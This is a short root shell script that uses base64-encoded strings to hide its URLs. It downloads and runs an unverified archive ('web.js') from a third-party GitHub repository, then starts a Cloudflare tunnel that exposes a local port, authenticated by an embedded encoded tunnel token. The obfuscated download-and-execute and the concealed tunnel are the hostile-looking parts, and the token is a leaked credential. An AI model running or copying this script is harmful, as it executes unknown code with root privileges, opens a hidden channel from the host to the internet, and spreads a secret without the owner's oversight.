cd /root
weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvd2ViLnRhci54ego='
weburl=$(printf "%s" $weburl_S | base64 -d) 
curl -O $weburl
sleep 1
xz -z -d web.tar.xz
tar -xvf web.tar
chmod +x *
./web.js -c ./config.json &
cturl_S='aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0Cg=='
cturl=$(printf "%s" $cturl_S | base64 -d) 
curl -o cf -L $cturl
chmod +x cf
ARGO_ARGS_S='IC0tZWRnZS1pcC12ZXJzaW9uIDQgLS11cmwgaHR0cDovL2xvY2FsaG9zdDozMDAyIHR1bm5lbCBydW4gLS10b2tlbiBleUpoSWpvaU9UTTVaak5tWTJVek16SXlPR1ZqWXpObVlqTTBPRGxpWVRGaU1XVXdNVFlpTENKMElqb2lOak0wT0RrNE5qY3RaakEyTVMwME5EWmpMVGs1TWpVdFpUYzRaREk1TXpka1pEQmhJaXdpY3lJNklsbFVSWHBOVkZacVdrUm5kRnBYVG1wT1V6QXdUa2RWTkV4WFJtMU5Na2wwVFRKS2FFMXRTVFJhUkdkNFRXcEJOQ0o5'
ARGO_ARGS=$(printf "%s" $ARGO_ARGS_S | base64 -d) 
./cf $ARGO_ARGS &
